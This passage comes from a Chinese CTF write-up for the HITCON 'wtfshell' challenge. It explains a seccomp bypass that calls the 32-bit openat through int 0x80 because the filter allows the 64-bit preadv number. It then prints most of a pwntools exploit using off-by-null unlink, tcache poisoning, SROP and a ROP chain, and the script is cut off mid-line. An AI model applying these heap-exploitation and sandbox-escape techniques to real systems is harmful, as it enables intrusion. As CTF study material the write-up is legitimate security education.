vlen, pos_l, pos_h)</span><br><span class="line"> 0055: 0x25 0x00 0x01 0x00000002  if (A &lt;= 0x2) goto 0057</span><br><span class="line"> 0056: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0057: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
<p>沙盒绕过是由 <code>winmt</code>  师傅看出来的🥰，沙盒大手子，太🐂了</p>
<ul>
<li>mmap 一块可写可执行的内存（沙盒 ban 了 mmap 参数 7，但是没有 ban 6）。</li>
<li>read shellcode 到 mmap 出来的内存。</li>
<li>shellcode 进行 orw。</li>
</ul>
<p>但是程序本身是白名单，并没有允许 <code>open</code> ，这该怎么办呢？</p>
<p>可以看到沙盒没有判断架构，而允许了 <code>preadv</code></p>
<p>而 <code>preadv</code>  在 64 位下调用号为：</p>
<p><img data-src="https://tvax3.sinaimg.cn/large/008qDYGVgy1h8ob64pju0j30bg0283z4.jpg" alt="4"></p>
<p>同时 <code>openat</code>  在 32 位下调用号为：</p>
<p><img data-src="https://tva4.sinaimg.cn/large/008qDYGVgy1h8ob6w20gfj30bs02n0tq.jpg" alt="5"></p>
<p>因此直接可用 <code>int0x80</code>  调用 32 位下的 <code>openat</code> 。</p>
<p>注意沙盒里判断了 <code>preadv</code>  的第一个参数需要大于 2，因此我们 <code>openat</code>  的第一个参数也需要大于 2，而当 <code>openat</code>  使用绝对路径的时候，第一个参数不影响结果，故这里最好用绝对路径 <code>/flag2</code> 。</p>
<h3 id="wtrshell2-exp"><a class="markdownIt-Anchor" href="#wtrshell2-exp">#</a> wtrshell2-exp</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">qwq</span>(<span class="params">name</span>):</span></span><br><span class="line">  log.success(<span class="built_in">hex</span>(name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">point</span>):</span></span><br><span class="line">    <span class="keyword">if</span> point == <span class="number">0</span>:</span><br><span class="line">        gdb.attach(r)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(r,<span class="string">&quot;b &quot;</span>+point)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;/mnt/hgfs/ubuntu/hitcon/heap/share/wtfshell&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/mnt/hgfs/ubuntu/hitcon/heap/share/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">payload</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;√&quot;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_data</span>(<span class="params">name,content</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;rip.&#x27;</span>+name</span><br><span class="line">    menu(payload)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_file</span>(<span class="params">name,flag</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;nsfw,&#x27;</span>+name+<span class="string">b&#x27;,&#x27;</span>+flag</span><br><span class="line">    menu(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_file</span>(<span class="params">name</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;omfg,&#x27;</span>+name</span><br><span class="line">    menu(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover_data</span>(<span class="params">name,content</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;wtf,&#x27;</span>+content+<span class="string">b&#x27;,&#x27;</span>+name</span><br><span class="line">    menu(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_file</span>(<span class="params">name</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;gtfo,&#x27;</span>+name</span><br><span class="line">    menu(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_user</span>(<span class="params">name</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;stfu,&#x27;</span>+name</span><br><span class="line">    menu(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_pwd</span>(<span class="params">name,pwd</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;asap,&#x27;</span>+name</span><br><span class="line">    menu(payload)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;password:&quot;</span>)</span><br><span class="line">    r.send(pwd)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;retype password:&quot;</span>)</span><br><span class="line">    r.send(pwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_all</span>():</span></span><br><span class="line">    payload = <span class="string">b&#x27;irl.&#x27;</span></span><br><span class="line">    menu(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">burp</span>(<span class="params">name,pwd</span>):</span></span><br><span class="line">    addr = <span class="string">&quot;\x80&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x6</span>):</span><br><span class="line">        log.success(<span class="string">&quot;addr: &quot;</span>+<span class="built_in">hex</span>(u64(addr.ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))))</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xb</span>,<span class="number">0xff</span>):</span><br><span class="line">            payload = <span class="string">b&#x27;asap,&#x27;</span>+name</span><br><span class="line">            menu(payload)</span><br><span class="line">            r.recvuntil(<span class="string">b&quot;password:&quot;</span>)</span><br><span class="line">            r.send(pwd)</span><br><span class="line">            r.recvuntil(<span class="string">b&quot;retype password:&quot;</span>)</span><br><span class="line">            r.send(pwd+addr+<span class="built_in">chr</span>(j)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            data=r.recvuntil(<span class="string">&quot;\n&quot;</span>,timeout=<span class="number">0.1</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;asap: &quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                addr+=<span class="built_in">chr</span>(j)</span><br><span class="line">                r.send(<span class="string">b&#x27;\x00\n&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> u64(addr.ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_addr</span>(<span class="params">filename,payload,size</span>):</span></span><br><span class="line">    whole_size = <span class="built_in">len</span>(payload)+<span class="number">1</span></span><br><span class="line">    no_null_payload = payload.replace(<span class="string">b&#x27;\x00&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">        <span class="keyword">if</span> no_null_payload[whole_size-i-<span class="number">2</span>:whole_size-i-<span class="number">1</span>] == <span class="string">b&#x27;a&#x27;</span>:</span><br><span class="line">            recover_data(filename,no_null_payload[<span class="number">0</span>:whole_size-i-<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">add_user(<span class="string">b&#x27;what&#x27;</span>)</span><br><span class="line">add_user(<span class="string">b&#x27;lotus&#x27;</span>)</span><br><span class="line">heap_base=burp(<span class="string">b&#x27;lotus&#x27;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x40</span>)-<span class="number">0x880</span></span><br><span class="line">key = heap_base&gt;&gt;<span class="number">12</span></span><br><span class="line"><span class="comment"># for i in range(0x7):</span></span><br><span class="line"><span class="comment"># new_file(b&#x27;chunk1&#x27;,b&#x27;3&#x27;)</span></span><br><span class="line"><span class="comment"># add_data(b&#x27;chunk1&#x27;)</span></span><br><span class="line">new_file(<span class="string">b&#x27;big&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">new_file(<span class="string">b&#x27;gbuff&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">new_file(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x7</span>):</span><br><span class="line">    new_file(<span class="string">b&quot;chunk&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    new_file(<span class="string">b&quot;chunk1&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">new_file(<span class="string">b&#x27;chunk21&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">new_file(<span class="string">b&#x27;chunk22&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x7</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x4</span>):</span><br><span class="line">        add_data(<span class="string">b&quot;chunk&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x2</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x2</span>):</span><br><span class="line">        add_data(<span class="string">b&quot;chunk1&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)  </span><br><span class="line">    add_data(<span class="string">b&quot;chunk1&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf0</span>+<span class="string">b&#x27;\n&#x27;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x3</span>):</span><br><span class="line">    recover_data(<span class="string">b&quot;chunk2&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x2</span>):</span><br><span class="line">        add_data(<span class="string">b&quot;chunk1&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)  </span><br><span class="line">    add_data(<span class="string">b&quot;chunk1&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf0</span>+<span class="string">b&#x27;\n&#x27;</span>) </span><br><span class="line"></span><br><span class="line">[add_data(<span class="string">b&#x27;big&#x27;</span>,p16(<span class="number">0x1650</span>)+<span class="string">b&#x27;/&#x27;</span>*(<span class="number">0x100</span>-<span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>)]</span><br><span class="line">add_data(<span class="string">b&#x27;big&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">new_file(<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x100</span>,<span class="string">b&#x27;3&#x27;</span>)<span class="comment">#use to get the free 0x110 tcache and add a chunk between the unsortedbin and the top chunk</span></span><br><span class="line"></span><br><span class="line">add_data(<span class="string">b&#x27;big&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)<span class="comment"># free the unsortedbin</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#add 0x408 back</span></span><br><span class="line">[add_data(<span class="string">b&#x27;gbuff&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x3</span>)]</span><br><span class="line">add_data(<span class="string">b&#x27;gbuff&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf8</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#add 0x521 chunk to off-by-null</span></span><br><span class="line">[add_data(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x5</span>)]</span><br><span class="line">add_data(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">[delete_file(<span class="string">b&quot;chunk&quot;</span>+<span class="built_in">str</span>(i).encode()) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x6</span>)]</span><br><span class="line"></span><br><span class="line">add_data(<span class="string">b&#x27;gbuff&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">delete_all()</span><br><span class="line"></span><br><span class="line">new_file(<span class="string">b&#x27;useless_chunk&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">[add_data(<span class="string">b&#x27;useless_chunk&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x3</span>)]</span><br><span class="line">add_data(<span class="string">b&#x27;useless_chunk&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add a 0x321 chunk and edit its fake_next_size</span></span><br><span class="line">new_file(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">[add_data(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>,<span class="string">b&#x27;\x31&#x27;</span>*<span class="number">0x100</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x3</span>)]</span><br><span class="line">add_data(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>,<span class="string">b&#x27;\x31&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">[recover_data(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>,<span class="string">b&#x27;\x31&#x27;</span>*(<span class="number">0x2ff</span>-i)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x6</span>)]</span><br><span class="line">recover_data(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>,<span class="string">b&#x27;\x31&#x27;</span>*(<span class="number">0x2ff</span>-<span class="number">6</span>)+<span class="string">b&#x27;\x09&#x27;</span>)</span><br><span class="line"></span><br><span class="line">menu(<span class="string">b&#x27;rip.&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x400</span>-<span class="number">4</span>))<span class="comment">#make off by null and clear the prev_size</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x9</span>):</span><br><span class="line">    new_file(<span class="string">b&quot;chunk1&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x9</span>):</span><br><span class="line">    recover_data(<span class="string">b&quot;chunk1&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;i&#x27;</span>*<span class="number">0x2f0</span>)</span><br><span class="line"></span><br><span class="line">fake_point = heap_base+<span class="number">0x2af0</span></span><br><span class="line">fake_point_addr = fake_point+<span class="number">0x30</span></span><br><span class="line">fake_unlink_chunk = <span class="string">b&#x27;i&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x1651</span>)+p64(fake_point_addr-<span class="number">0x18</span>)+p64(fake_point_addr-<span class="number">0x10</span>)+p64(fake_point_addr-<span class="number">0x20</span>)+p64(fake_point_addr-<span class="number">0x18</span>)+p64(fake_point)*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">write_addr(<span class="string">b&#x27;chunk15&#x27;</span>,fake_unlink_chunk,<span class="built_in">len</span>(fake_unlink_chunk)-<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">[delete_file(<span class="string">b&quot;chunk1&quot;</span>+<span class="built_in">str</span>(i).encode()) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x4</span>)]</span><br><span class="line">delete_file(<span class="string">b&#x27;chunk17&#x27;</span>)</span><br><span class="line">delete_file(<span class="string">b&#x27;chunk18&#x27;</span>)</span><br><span class="line">delete_file(<span class="string">b&#x27;chunk16&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#off by null unlink</span></span><br><span class="line"></span><br><span class="line">delete_file(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#clear the tcache list 0x20</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xa</span>):</span><br><span class="line">    new_file(<span class="string">b&#x27;useless&#x27;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    recover_data(<span class="string">b&#x27;useless&#x27;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">new_file(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2e0</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">new_file(<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x2d0</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak_libc_base</span></span><br><span class="line">show_file(<span class="string">b&#x27;chunk14&#x27;</span>)</span><br><span class="line">libc_base = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>,<span class="string">b&#x27;\0&#x27;</span>))-<span class="number">0x1f6cc0</span></span><br><span class="line"></span><br><span class="line">new_file(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x220</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new_file(<span class="string">b&#x27;edit_tcache_next&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">recover_data(<span class="string">b&#x27;edit_tcache_next&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x220</span>)</span><br><span class="line">strtok_libc_got = libc_base + <span class="number">0x1f6040</span></span><br><span class="line">write_addr(<span class="string">b&#x27;edit_tcache_next&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">192</span>+p64((strtok_libc_got-<span class="number">0x20</span>)^(key+<span class="number">3</span>)),<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">new_file(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">magic_gadget = libc_base + <span class="number">0x8c385</span> <span class="comment"># mov rdx, qword ptr [rdi + 8]; mov rax, qword ptr [rdi]; mov rdi, rdx; jmp rax;</span></span><br><span class="line"></span><br><span class="line">new_file(<span class="string">b&#x27;go_attack&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">recover_data(<span class="string">b&#x27;go_attack&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(magic_gadget)[<span class="number">0</span>:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line">address = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = address</span><br><span class="line">frame.rdx = <span class="number">0x200</span></span><br><span class="line">frame.rsp = address</span><br><span class="line">frame.rip = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = p64(libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span>) + p64(heap_base + <span class="number">0x3d50</span>)</span><br><span class="line">payload += <span class="built_in">bytes</span>(frame)</span><br><span class="line">menu(payload)</span><br><span class="line"></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x3fa43</span></span><br><span class="line">pop_rbx_ret = libc_base + <span class="number">0x2f1d1</span></span><br><span class="line">pop_rcx_ret = libc_base + <span class="number">0x99a83</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x23b65</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x251be</span></span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0x166262</span></span><br><span class="line">pop_r8_ret = libc_base + <span class="number">0x8c3de</span> <span class="comment"># pop r8; mov qword ptr fs:[0x300], rdi; ret;</span></span><br><span class="line">syscall = libc_base + <span class="number">0x8cc36</span></span><br><span class="line">int_80 = libc_base + <span class="number">0xce0cb</span></span><br><span class="line"></span><br><span class="line">rop = p64(pop_rdi_ret) + p64(<span class="number">0x100000</span>)</span><br><span class="line">rop += p64(pop_rsi_ret) + p64(<span class="number">0x1000</span>)</span><br><span class="line">rop += p64(pop_rdx_ret) + p64(<span class="number">6</span>)</span><br><span class="line">rop += p64(pop_rcx_ret) + p64(<span class="number">0x22</span>)</span><br><span class="line">rop += p64(pop_r8_ret) + p64(<span class="number">0xffffffff</span>)</span><br><span class="line">rop += p64(libc_base + libc.sym[<span class="string">&#x27;mmap&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(pop_rsi_ret) + p64(<span class="number">0x100000</span>)</span><br><span class="line">rop += p64(pop_rdx_ret) + p64(<span class="number">0x200</span>)</span><br><span class="line">rop += p64(libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop += p64(<span class="number">0x100008</span>)</span><br><span class="line">sleep(<span 